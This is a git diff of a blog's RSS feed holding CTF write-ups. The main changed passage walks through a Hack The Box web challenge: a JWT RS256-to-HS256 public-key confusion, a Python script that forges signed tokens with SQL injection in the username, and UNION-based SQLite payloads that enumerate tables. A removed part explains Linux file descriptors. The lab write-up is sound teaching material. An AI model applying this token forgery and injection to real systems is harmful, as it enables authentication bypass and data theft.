+&lt;p&gt;The attack occurs because the server erroneously uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jwt.verify&lt;/code&gt; when the algorithm is switched from an RSA-based algorithm (RSxxx) to an HMAC-based algorithm (HSxxx). HMAC SHA256 is a symmetric encryption method, while RSA isn’t. In this vulnerability, if the algorithms are swapped, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jwt.verify&lt;/code&gt; will make use of the public key as HMAC secret key to decode the JWT and verify it, thus making the application to accept maliciously crafted tokens.&lt;/p&gt;
 
 &lt;p&gt;Let’s see if it is our case. The first condition is met: the JWT header algorithm reveals to be RS256. The second condition is also met: if we look at the JWTHelper.js file, we see that in the decoding part the function accepts both RS256 and HS256.&lt;/p&gt;
 
@@ -197,7 +661,7 @@ Archive:  Under Construction.zip
 
 &lt;p&gt;&lt;img src=&quot;../figs/underc12.png&quot; alt=&quot;jwt.io signing jwt&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;After pasting the public key provided by the JWT in the box above, we can see that this is the key used to sign this token. Therefore, the third condition is also met.&lt;/p&gt;
+&lt;p&gt;After pasting the public key - provided by the JWT - in the box above, we can see that this is the correct public key used to sign the token. Therefore, the third condition is also met.&lt;/p&gt;
 
 &lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
 
@@ -205,7 +669,7 @@ Archive:  Under Construction.zip
 
 &lt;p&gt;By combining these vulnerabilities, the attack strategy becomes clear: we can craft a JWT with a SQL injection payload in the username field. By exploiting the public key confusion, we can make the application accept our JWT.&lt;/p&gt;
 
-&lt;p&gt;First, let’s save the public key in our local machine under the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pubkey.pem&lt;/code&gt;. Remember, for this to work, we need to save the key exactly as it is below:&lt;/p&gt;
+&lt;p&gt;First, let’s save the public key on our local machine, naming the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pubkey.pem&lt;/code&gt;. Remember, for this to work correctly, it’s crucial to save the key exactly as shown below:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
@@ -218,9 +682,9 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
 -----END PUBLIC KEY-----
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;No new lines, including both begin’s statements.&lt;/p&gt;
+&lt;p&gt;No new lines. And make sure to include both begin statements.&lt;/p&gt;
 
-&lt;p&gt;Let’s build a Python script that will create a maliciously crafted and signed JWT:&lt;/p&gt;
+&lt;p&gt;Let’s build a Python script that will create a maliciously crafted and signed JWT with our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pubkey.pem&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
 &lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
@@ -245,7 +709,7 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
     &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alg&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;HS256&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;JWT&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pk&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pk_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-    &lt;span class=&quot;c1&quot;&gt;# convert the base64
+    &lt;span class=&quot;c1&quot;&gt;# convert to base64
 &lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;encoded_h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;encoded_p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
@@ -260,17 +724,17 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
     &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jwt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;To use this script, we simply run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x exploit.py&lt;/code&gt;, and then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./exploit.py &quot;sqli payload&quot;&lt;/code&gt;, and it will generate e usable JWT token for the application! To test if it is working, we will simply pass our username as a payload:&lt;/p&gt;
+&lt;p&gt;To use this script, we simply run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x exploit.py&lt;/code&gt;, and then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./exploit.py &quot;sqli payload&quot;&lt;/code&gt;, and it will generate a valid, maliciously crafted, JWT token for the application! To test if it is working, we will simply pass our username as a payload:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exploit.py &lt;span class=&quot;s2&quot;&gt;&quot;mula&quot;&lt;/span&gt;
 eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJtdWxhIiwgInBrIjogIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4ifQ.qE9eS5hAKyvxgcVyh4Ne26-GNklpuDVNli4VkDeSYRQ
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;This JWT must log us in as mula, even though it is crafted and using HS256 algorithm instead of RS256:&lt;/p&gt;
+&lt;p&gt;This JWT must log us in as mula:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;../figs/underc13.png&quot; alt=&quot;crafted jwt response&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;As we can see, we successfuly logged in, proving the public key confusion vulnerability! To check if the server is vulnerable to SQL injection, we will use the following payload:&lt;/p&gt;
+&lt;p&gt;As we can see, we successfuly logged in, proving the public key confusion vulnerability is present! To check if the server is vulnerable to SQL injection, we will use the following payload:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exploit.py &lt;span class=&quot;s2&quot;&gt;&quot;&apos; union SELECT ;--&quot;&lt;/span&gt;
 eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIFNFTEVDVCA7LS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.DucJUAHb7T7y4mjQltzMcgQaDodL1E7VcWAgruIiJnQ
@@ -282,17 +746,17 @@ eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIFNFTEVDVCA
 
 &lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
 
-&lt;p&gt;Alright! Now we need to solve this bad boy. We still don’t know where the flag is, but with a SQL injection we are able to enumerate the database tables and hopefully find the flag. The next payload is used for identifying the number of columns the of first select statement: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1,1,...,1-- -&lt;/code&gt;, where the number of ones in the injection is the number of columns. We do this until we don’t get an error from the application. After attempting with (1), (1,1) and (1,1,1), we find that the number of columns is 3. The payload is:&lt;/p&gt;
+&lt;p&gt;Alright! Now we need to solve this bad boy. We still don’t know where the flag is, but with a SQL injection we are able to enumerate the database tables and hopefully find the flag. The following payload is used for identifying the number of columns of first select statement: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1,1,...,1-- -&lt;/code&gt;, where the number of ones in the injection is the number of columns. We try this until we don’t get an error from the application. After attempting with (1), (1,1) and (1,1,1), we find that the number of columns is 3. The payload is:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exploit.py &lt;span class=&quot;s2&quot;&gt;&quot;&apos; union select 1,1,1-- -&quot;&lt;/span&gt;
 eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIHNlbGVjdCAxLDEsMS0tIC0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.y9yJbvfy0ARuq-hmEuYxSGJHcF5h1q3BonCf77iHi_c
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Now, we need to find which columns are being retrieved by the application. To do so, we change our payload to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1,2,3-- -&lt;/code&gt;. Since the application returns the username for us when we pass it in the token, this union select statement will print out the username column number. This is the response for this payload:&lt;/p&gt;
+&lt;p&gt;Now, we need to find which columns are being retrieved by the application. To do so, we change our payload to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1,2,3-- -&lt;/code&gt;. Since the application returns the username back to us extracted from the token, this union select statement will print out the username column number. The respons to this paylod is:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;../figs/underc15.png&quot; alt=&quot;second payload&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;As we can see, the username column is the second one. We need to know this, because this is the column that the application prints out for us. If we want it to print the flag, we will need to inject the flag payload in this position.&lt;/p&gt;
+&lt;p&gt;As we can see, the username column is the second one. This is important to know because this column is what the application displays in clear text for us. If we want it to print the flag, we will need to inject the flag payload in this position.&lt;/p&gt;
 
 &lt;p&gt;Now, to retrieve all the tables, we need to select the table names in the 2nd column position. With help of &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name&quot;&gt;PayloadAllTheThings&lt;/a&gt;, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select 1, group_concat(tbl_name), 3 from sqlite_master where type=&apos;table&apos; and tbl_name NOT like &apos;sqlite_%&apos;-- -&lt;/code&gt;. This will fetch all tables in the database:&lt;/p&gt;
 
@@ -2056,244 +2520,6 @@ daddy! I just managed to create a &lt;span class=&quot;nb&quot;&gt;hash &lt;/spa
         <link>http://localhost:4000//collision-pwnable</link>
         <link href="http://localhost:4000/collision-pwnable"/>
         <guid isPermaLink="true">http://localhost:4000/collision-pwnable</guid>
-      </item>
-    
-      <item>
-        <title>fd - pwnable.kr</title>
-        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://pwnable.kr&quot;&gt;Pwnable&lt;/a&gt; is a website for cybersecurity enthusiasts willing to challenge themselves by solving different kinds of CTFs. I’ve come across it in one of my lazy YT shorts watching moments, where I found out about someone solving these CTFs. As an enthusiast myself, I thought: well, let’s give it a shot.&lt;/p&gt;
-
-&lt;p&gt;To my surprise, not only did it look pretty fun, but the level tag images are the different Ragnarok Online monsters cards. Ok! You got me here already! As someone with the alias ‘Cecil Daemon’, I felt obligated to start cracking each level.&lt;/p&gt;
-
-&lt;p&gt;This post is about solving the very first level, named ‘fd’. Let’s drop our Poring card!&lt;/p&gt;
-
-&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;Mommy! what is a file descriptor in Linux?&lt;/p&gt;
-
-  &lt;p&gt;try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
-https://youtu.be/971eZhMHQQw&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;ssh fd@pwnable.kr -p2222 (pw:guest)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
-
-&lt;p&gt;Ok, I’ll be spilling some gold here by letting you all know how I approach CTF challenges with a mindset that rarely fails me. First off, I’m not a C/C++ pro developer, but I have my fair share of coding in these languages. However, technical jargon was not always my strength. “&lt;em&gt;What the f*** is a file descriptor&lt;/em&gt;” was my first thought. Little did I know that I knew what it was, but not from its name.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
-
-&lt;p&gt;Think of it like this: if we don’t know what a file descriptor is, we’d better step back for a moment and learn about it. This is the first step - understanding the problem. In fact, I didn’t learn this doing CTFs.  I learned it while I was pursuing my totally unrelated Master’s Degree in Physics. The word for this is &lt;strong&gt;research&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;Research is always your best friend here, and the more we are comfortable at learning stuff, reading documentation and practicing what we’ve learned, the more easily these challenges blossom.&lt;/p&gt;
-
-&lt;h3 id=&quot;what-is-a-file-descriptor&quot;&gt;&lt;a href=&quot;#fd-definition&quot;&gt;&lt;/a&gt;What is a File Descriptor?&lt;/h3&gt;
-
-&lt;p&gt;File Descriptors are, put in simple terms, non-negative integers - more specifically 0, 1 and 2 - that are shorthands for three important concepts: 0 for Standard Input (stdin), 1 for Standard Output (stdout), and 2 for Standard Error (stderr). The table below summarizes what each of these terms mean&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: center&quot;&gt;Descriptor name&lt;/th&gt;
-      &lt;th&gt;Short name&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Description&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descriptor integer&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;Standard in&lt;/td&gt;
-      &lt;td&gt;stdin&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Input from keyboard&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;0&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;Standard out&lt;/td&gt;
-      &lt;td&gt;stdout&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Output from console&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: center&quot;&gt;Standard err&lt;/td&gt;
-      &lt;td&gt;stderr&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Error output to the console&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;A simple example in the Linux terminal would be redirecting the descriptors to programs or files. For example, typing a wrong or nonexistent command - like ‘dsasd’ - in the terminal will raise a “command not found” error:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dsasd
-bash: dsasd: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;However, if we redirect our stderr to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt;, we should see no error popping up:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dsasd 2&amp;gt;/dev/null
-kaizen@celestial ~ :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The same thing is true for our stdout descriptor. Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; prints all contents in the current directory to our stdout descriptor:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 0
-drwxr-xr-x  5 kaizen &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;160 Dec  1 23:39 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxrwxrwt 17 root   root  860 Dec  1 23:39 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file1
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file2
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file3
-drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test1
-drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test2
-drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test3
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We could redirect the stdout to a file, so that the output will be saved into it:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; 1&amp;gt;stdout
-kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;stdout
-total 0
-drwxr-xr-x  5 kaizen &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;180 Dec  1 23:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxrwxrwt 17 root   root  860 Dec  1 23:39 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file1
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file2
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file3
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:41 stdout
-drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test1
-drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test2
-drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test3
